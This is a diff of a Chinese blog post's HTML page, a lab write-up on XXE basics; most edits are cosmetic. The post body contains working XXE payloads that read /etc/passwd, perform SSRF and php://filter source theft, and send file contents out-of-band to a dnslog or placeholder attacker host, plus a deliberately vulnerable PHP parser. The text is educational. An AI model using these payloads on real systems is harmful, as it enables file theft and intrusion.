@@ -7,25 +7,10 @@
   <meta http-equiv="expires" content="0">
   
   <title>XXE基础 | Qexzi&#39;s Blog</title>
+  <link rel="canonical" href="https://Qexzi.github.io/2026/07/16/XXE基础/">
   <meta name="author" content="Qexzi">
   
-  <meta name="description" content="0x00.基础知识1. XIMIL是一种标记语言XML指可扩展标记语言(EXtensible Markup Language)把数据结构化后传输给对方让对方在结构化的数据中进行读取。
-假设你要告诉同事“张三的座机是010-8888，手机是1380000，邮箱是zhang@xx.com”。
-
-非结构化（纯文本）：你发微信：“张三电话010-8888，手机1380000，邮箱zhang@xx.com”。如果同事的电脑要提取“手机号”，得写复杂的模糊匹配（万一张三写了“Tel”或者“Mobile”呢？）。
-
-结构化（XML）：
-  &amp;lt;员工&amp;gt;    &amp;lt;姓名&amp;gt;张三&amp;lt;/姓名&amp;gt;    &amp;lt;座机&amp;gt;010-8888&amp;lt;/座机&amp;gt;    &amp;lt;手机&amp;gt;1380000&amp;lt;/手机&amp;gt;    &amp;lt;邮箱&amp;gt;zhang@xx.com&amp;lt;/邮箱&amp;gt;&amp;lt;/员工&amp;gt;
-
-2. 标签没有被预定义，需要自行定义
-这是XML与它的“表哥”HTML最本质的区别：
-
-HTML（预定义标签）：浏览器只认识 [h1]（大标题）、[p]（段落）、[table]（表格）。标签是写死的，你不能自己发明一个 &amp;lt;帅哥&amp;gt; 标签让浏览器渲染，因为它不认识。
-XML（自定义标签）：XML没有任何现成的标签库。它相当于给你一张白纸，完全由你（发送方和接收方）商量着来。比如，你们俩约定好用 &amp;lt;员工工号&amp;gt; 来传工号，用 &amp;lt;紧急联系人&amp;gt; 传亲属电话。只要双方都认这个“自定义名字”，数据就能正确读取。
-
-3. 没有任何行为的 XML 的漏洞何处来？
-绝大多数（超过95%）的XXE漏洞，核心根源就是利用了DTD声明中的“实体（ENTITY）声明”功能。
-DTD声明规定：这个 XML 文档里可以出现哪些标签、标签之间的层级关系、标签里能填什么类型的数据，以及可以提前定义哪些“快捷方式（实体）"> 
+  <meta name="description" content="网络安全学习笔记：Web 渗透、内网攻防、CTF、PWN 与计算机基础知识">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -38,6 +23,8 @@ DTD声明规定：这个 XML 文档里可以出现哪些标签、标签之间的
   
 
   
+    <link rel="alternative" href="/atom.xml" title="Qexzi&#39;s Blog" type="application/atom+xml">
+  
   
     <link href="/zhuzhuxia.png" rel="icon">
   
@@ -48,7 +35,6 @@ DTD声明规定：这个 XML 文档里可以出现哪些标签、标签之间的
   <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
   <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
   <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
-  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
   <link rel="stylesheet" href="/css/mobile-optimized.css" media="screen" type="text/css">
   <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
 
@@ -56,41 +42,39 @@ DTD声明规定：这个 XML 文档里可以出现哪些标签、标签之间的
 
   <!-- analytics -->
   
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-70812759-1');
-</script>
 
 
 
 
-
-
-<meta name="generator" content="Hexo 8.1.1"><script>
-MathJax = {
-  tex: {
-    inlineMath: [['$', '$'], ['\\(', '\\)']],
-    displayMath: [['$$', '$$'], ['\\[', '\\]']],
-    processEscapes: true,
-    processEnvironments: true
-  },
-  options: {
-    skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-  },
-  startup: {
-    pageReady: () => {
-      return MathJax.startup.defaultPageReady();
+  
+  <!-- MathJax（仅含公式的页面加载，由 scripts/mathjax-injector.js 检测标记） -->
+  <script>
+  MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      displayMath: [['$$', '$$'], ['\\[', '\\]']],
+      processEscapes: true,
+      processEnvironments: true
+    },
+    options: {
+      skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    startup: {
+      pageReady: () => {
+        return MathJax.startup.defaultPageReady();
+      }
     }
-  }
-};
-</script>
-<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
-</head>
+  };
+  </script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  
+
+  
+  <!-- 结构化数据：帮助搜索引擎理解文章元信息 -->
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"XXE基础","datePublished":"2026-07-16T04:00:00.000Z","dateModified":"2026-07-16T04:00:00.000Z","author":{"@type":"Person","name":"Qexzi"},"mainEntityOfPage":"https://Qexzi.github.io/2026/07/16/XXE基础/","description":"0x00.基础知识1. XIMIL是一种标记语言XML指可扩展标记语言(EXtensible Markup Language)把数据结构化后传输给对方让对方在结构化的数据中进行读取。 假设你要告诉同事“张三的座机是010-8888，手机是1380000，邮箱是zhang@xx.com”。 非结构化（纯文本）：你发微信：“张三电话010-8888，手机1380000，邮箱zhang@xx.com”。"}</script>
+  
+
+<meta name="generator" content="Hexo 8.1.1"></head>
 
  <body>  
   <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
@@ -160,9 +144,9 @@ MathJax = {
 		  
 
 		  <h2 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00.基础知识"></a>0x00.基础知识</h2><p><strong>1. XIMIL是一种标记语言</strong><br>XML指可扩展标记语言(EXtensible Markup Language)把<strong>数据结构化</strong>后<strong>传输</strong>给对方让对方在结构化的数据中进行读取。</p>
-<p>假设你要告诉同事“张三的座机是010-8888，手机是1380000，邮箱是<a href="mailto:&#x7a;&#x68;&#97;&#110;&#x67;&#x40;&#120;&#x78;&#46;&#x63;&#x6f;&#109;">zhang@xx.com</a>”。</p>
+<p>假设你要告诉同事“张三的座机是010-8888，手机是1380000，邮箱是<a href="mailto:&#x7a;&#104;&#x61;&#110;&#x67;&#x40;&#x78;&#120;&#46;&#x63;&#111;&#109;">zhang@xx.com</a>”。</p>
 <ul>
-<li><p><strong>非结构化（纯文本）</strong>：你发微信：“张三电话010-8888，手机1380000，邮箱<a href="mailto:&#122;&#104;&#97;&#x6e;&#x67;&#64;&#x78;&#120;&#x2e;&#x63;&#x6f;&#x6d;">zhang@xx.com</a>”。<br>如果同事的电脑要提取“手机号”，得写复杂的模糊匹配（万一张三写了“Tel”或者“Mobile”呢？）。</p>
+<li><p><strong>非结构化（纯文本）</strong>：你发微信：“张三电话010-8888，手机1380000，邮箱<a href="mailto:&#122;&#104;&#x61;&#x6e;&#x67;&#64;&#x78;&#x78;&#46;&#99;&#111;&#x6d;">zhang@xx.com</a>”。<br>如果同事的电脑要提取“手机号”，得写复杂的模糊匹配（万一张三写了“Tel”或者“Mobile”呢？）。</p>
 </li>
 <li><p><strong>结构化（XML）</strong>：</p>
   <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">员工</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">姓名</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">姓名</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">座机</span>&gt;</span>010-8888<span class="tag">&lt;/<span class="name">座机</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">手机</span>&gt;</span>1380000<span class="tag">&lt;/<span class="name">手机</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">邮箱</span>&gt;</span>zhang@xx.com<span class="tag">&lt;/<span class="name">邮箱</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">员工</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
@@ -192,16 +176,16 @@ MathJax = {
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&gt;&gt;1. &lt; -&gt;  <span class="symbol">&amp;lt;</span>  小于号（必须转义） </span><br><span class="line">&gt;&gt;2. &gt; -&gt;  <span class="symbol">&amp;gt;</span>  大于号（建议转义） </span><br><span class="line">&gt;&gt;3. &amp; -&gt;  <span class="symbol">&amp;amp;</span>  与符号（必须转义） </span><br><span class="line">&gt;&gt;4. &quot; -&gt;  <span class="symbol">&amp;quot;</span>  双引号 </span><br><span class="line">&gt;&gt;5. &#x27; -&gt;  <span class="symbol">&amp;apos;</span>  单引号 </span><br></pre></td></tr></table></figure><p><strong>6. 注释不能嵌套</strong><br>注释的格式是 <!-- 注释内容 -->，但注释内容里面不能再出现 –。</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&gt;正确：<span class="comment">&lt;!-- 这是用户信息 --&gt;</span></span><br><span class="line">&gt;&gt;错误：<span class="comment">&lt;!-- 外层 &lt;!-- 内层 --&gt;</span> 外层 --&gt;（嵌套注释，报错）</span><br></pre></td></tr></table></figure></blockquote>
 </blockquote>
-<p>感谢重庆橙科技的XXE靶场：<a target="_blank" rel="noopener" href="https://github.com/mcc0624/XXE.git">https://github.com/mcc0624/XXE.git</a><br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_1.png" alt="在这里插入图片描述"></p>
+<p>感谢重庆橙科技的XXE靶场：<a target="_blank" rel="noopener" href="https://github.com/mcc0624/XXE.git">https://github.com/mcc0624/XXE.git</a><br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_1.png" alt="XXE基础·图1"></p>
 <hr>
 <h2 id="0x01-XXE漏洞演示"><a href="#0x01-XXE漏洞演示" class="headerlink" title="0x01 XXE漏洞演示"></a>0x01 XXE漏洞演示</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);                  <span class="comment">// 关闭所有错误输出，屏蔽报错信息</span></span><br><span class="line">	<span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>); <span class="comment">// 开启XML外部实体加载，支持解析外部实体</span></span><br><span class="line">	<span class="variable">$xml</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>); <span class="comment">// 获取POST原始请求体XML数据</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xml</span>))&#123;                     <span class="comment">// 判断是否成功读取到XML内容</span></span><br><span class="line">	    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();         <span class="comment">// 实例DOMDocument用于解析XML</span></span><br><span class="line">	    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xml</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <span class="comment">// 加载XML，开启实体解析、加载DTD</span></span><br><span class="line">	    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>); <span class="comment">// dom对象转simpleXml，简化节点读取</span></span><br><span class="line">	    <span class="variable">$benben</span> = <span class="variable">$creds</span>-&gt;admin;           <span class="comment">// 读取xml下admin节点内容</span></span><br><span class="line">	    <span class="keyword">echo</span> <span class="variable">$benben</span>;                      <span class="comment">// 输出admin节点文本</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);            <span class="comment">// 高亮打印当前脚本源代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>对于payload：<code>&lt;root&gt;&lt;admin&gt;hacker&lt;/admin&gt;&lt;/root&gt;</code><br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_2.png" alt="在这里插入图片描述"></p>
-<p>对于payload：<code>&lt;admin&gt;hacker&lt;/admin&gt;</code><br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_3.png" alt="在这里插入图片描述"></p>
+<p>对于payload：<code>&lt;root&gt;&lt;admin&gt;hacker&lt;/admin&gt;&lt;/root&gt;</code><br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_2.png" alt="XXE基础·图2"></p>
+<p>对于payload：<code>&lt;admin&gt;hacker&lt;/admin&gt;</code><br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_3.png" alt="XXE基础·图3"></p>
 <p>最终payload：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">admin</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">admin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_4.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_4.png" alt="XXE基础·图4"></p>
 <p><strong>补充：</strong></p>
 <table>
 <thead>
@@ -367,56 +351,56 @@ MathJax = {
 <li>❌：不支持（该语言环境下无法直接使用此协议）</li>
 </ul>
 <hr>
-<h2 id="0x02-XXE使用外部实体检索文件"><a href="#0x02-XXE使用外部实体检索文件" class="headerlink" title="0x02.XXE使用外部实体检索文件"></a>0x02.XXE使用外部实体检索文件</h2><p>对于一个登录框，怎么判断其存在xxe呢？<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_5.png" alt="在这里插入图片描述"></p>
-<p>admin登录<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_6.png" alt="在这里插入图片描述"></p>
-<p>hacker登录<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_7.png" alt="在这里插入图片描述"></p>
+<h2 id="0x02-XXE使用外部实体检索文件"><a href="#0x02-XXE使用外部实体检索文件" class="headerlink" title="0x02.XXE使用外部实体检索文件"></a>0x02.XXE使用外部实体检索文件</h2><p>对于一个登录框，怎么判断其存在xxe呢？<br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_5.png" alt="XXE基础·图5"></p>
+<p>admin登录<br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_6.png" alt="XXE基础·图6"></p>
+<p>hacker登录<br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_7.png" alt="XXE基础·图7"></p>
 <p>通过两次登录可知，<code>username</code>会回显到登录页面，那是不是存在一个可能，外带的数据也在这个位置显示出来（与sql注入回显数据有点像），<strong>即我们可以确定存在回显位置</strong></p>
-<p>检查（使用各种手段，抓包等等）数据提交方式，发现是xml数据提交（还是抓包直观）<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_8.png" alt="在这里插入图片描述"></p>
-<p>实际上F12也行·<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_9.png" alt="在这里插入图片描述"></p>
+<p>检查（使用各种手段，抓包等等）数据提交方式，发现是xml数据提交（还是抓包直观）<br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_8.png" alt="XXE基础·图8"></p>
+<p>实际上F12也行·<br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_9.png" alt="XXE基础·图9"></p>
 <p>payload：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_10.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_10.png" alt="XXE基础·图10"></p>
 <hr>
-<h2 id="0x03-利用XXE参数实体读取文件"><a href="#0x03-利用XXE参数实体读取文件" class="headerlink" title="0x03.利用XXE参数实体读取文件"></a>0x03.利用XXE参数实体读取文件</h2><p>与上同理，但是存在输入检查<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_11.png" alt="在这里插入图片描述"></p>
+<h2 id="0x03-利用XXE参数实体读取文件"><a href="#0x03-利用XXE参数实体读取文件" class="headerlink" title="0x03.利用XXE参数实体读取文件"></a>0x03.利用XXE参数实体读取文件</h2><p>与上同理，但是存在输入检查<br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_11.png" alt="XXE基础·图11"></p>
 <p><strong>使用攻击服务器绕过</strong>：</p>
-<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_12.png" alt="在这里插入图片描述"></p>
-<p>创建<strong>hacker.dtd</strong>文件<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_13.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_12.png" alt="XXE基础·图12"></p>
+<p>创建<strong>hacker.dtd</strong>文件<br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_13.png" alt="XXE基础·图13"></p>
 <p>即dtd： <code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></p>
-<p>上传到攻击服务器<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_14.png" alt="在这里插入图片描述"></p>
+<p>上传到攻击服务器<br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_14.png" alt="XXE基础·图14"></p>
 <p>则有payload：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;存放dtd文件的url&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_15.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_15.png" alt="XXE基础·图15"></p>
 <p>成功读取，搞定收工</p>
 <hr>
-<h2 id="0x04-利用XXE进行SSRF漏洞利用"><a href="#0x04-利用XXE进行SSRF漏洞利用" class="headerlink" title="0x04.利用XXE进行SSRF漏洞利用"></a>0x04.利用XXE进行SSRF漏洞利用</h2><p>靶场问题，忽略<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_16.png" alt="在这里插入图片描述"></p>
+<h2 id="0x04-利用XXE进行SSRF漏洞利用"><a href="#0x04-利用XXE进行SSRF漏洞利用" class="headerlink" title="0x04.利用XXE进行SSRF漏洞利用"></a>0x04.利用XXE进行SSRF漏洞利用</h2><p>靶场问题，忽略<br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_16.png" alt="XXE基础·图16"></p>
 <p>payload：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://10.1.2.3/?cmd=cat%20./flag&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>直接回显flag，没什么深奥的<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_17.png" alt="在这里插入图片描述"></p>
+<p>直接回显flag，没什么深奥的<br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_17.png" alt="XXE基础·图17"></p>
 <p>搞掂，收工</p>
 <hr>
 <h2 id="0x05-使用XXE利用php伪协议读取文件"><a href="#0x05-使用XXE利用php伪协议读取文件" class="headerlink" title="0x05.使用XXE利用php伪协议读取文件"></a>0x05.使用XXE利用php伪协议读取文件</h2><p>相比较file伪协议，PHP伪协议可以对读取出的文件进行数据编码。在XXE漏洞的基础上，使用PHP伪协议对文件进行读取并编码。</p>
 <p>由上题可以存在ssrf漏洞，现在我们的目标是使用php伪协议读取内网（10.1.2.3）的网站源代码</p>
 <p>疑问解答：不是由cmd命令执行吗？为什么不可以直接cat网站原码？（如下图）</p>
-<p>存在index.php<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_18.png" alt="在这里插入图片描述"></p>
-<p>cat+index.php 返回结果为空<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_19.png" alt="在这里插入图片描述"></p>
+<p>存在index.php<br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_18.png" alt="XXE基础·图18"></p>
+<p>cat+index.php 返回结果为空<br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_19.png" alt="XXE基础·图19"></p>
 <p>payload：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=http://10.1.2.3/?cmd=cat+index.php&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_20.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_20.png" alt="XXE基础·图20"></p>
 <p>搞掂，收工</p>
 <hr>
 <h2 id="0x06-XXE命令执行"><a href="#0x06-XXE命令执行" class="headerlink" title="0x06.XXE命令执行"></a>0x06.XXE命令执行</h2><ul>
 <li><strong>expect:&#x2F;&#x2F;</strong><br>由expect:&#x2F;&#x2F;封装协议打开的数据流PTY通过提供了对进程stdio、stdout和stderr的访问。<br>expert:&#x2F;&#x2F;封装协议默认未开启，为了使用，必须靶机中安装有效的Expect扩展。</li>
 </ul>
-<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_21.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_21.png" alt="XXE基础·图21"></p>
 <p>理论payload：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;excpect://id&quot;</span>&gt;</span>]&gt;</span>   //其中id是命令</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_22.png" alt="在这里插入图片描述"></p>
-<p>删除 <code>&lt;?xml version=&quot;1.0&quot;?&gt;</code> 就可以了，可能是靶场环境问题，忽略<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_23.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_22.png" alt="XXE基础·图22"></p>
+<p>删除 <code>&lt;?xml version=&quot;1.0&quot;?&gt;</code> 就可以了，可能是靶场环境问题，忽略<br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_23.png" alt="XXE基础·图23"></p>
 <p>靶场没有被指expect:&#x2F;&#x2F;环境，所以无法演示其他命令，只是做了“假执行”，收工</p>
 <hr>
 <h2 id="0x07-无回显XXE带外数据"><a href="#0x07-无回显XXE带外数据" class="headerlink" title="0x07.无回显XXE带外数据"></a>0x07.无回显XXE带外数据</h2><ol>
@@ -426,9 +410,9 @@ MathJax = {
 <p>dnslog 验证payload</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://xxxxxx.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_24.png" alt="在这里插入图片描述"></p>
-<p>dnslog有查询记录，说明有访问外网<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_25.png" alt="在这里插入图片描述"></p>
-<p>如果不确定目标服务器能不能做域名解析，实际上可以直接访问我们攻击服务器的攻击端点，然后查看日志（如下图）<br><img src="/images/XXE%E5%9F%BA%E7%A1%80/image_26.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_24.png" alt="XXE基础·图24"></p>
+<p>dnslog有查询记录，说明有访问外网<br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_25.png" alt="XXE基础·图25"></p>
+<p>如果不确定目标服务器能不能做域名解析，实际上可以直接访问我们攻击服务器的攻击端点，然后查看日志（如下图）<br><img loading="lazy" decoding="async" src="/images/XXE%E5%9F%BA%E7%A1%80/image_26.png" alt="XXE基础·图26"></p>
 <p>错误的数据外带payload：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">send</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://&lt;攻击服务器&gt;/%file;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -437,12 +421,12 @@ MathJax = {
 <p>第一部分payload：evil.dtd</p>
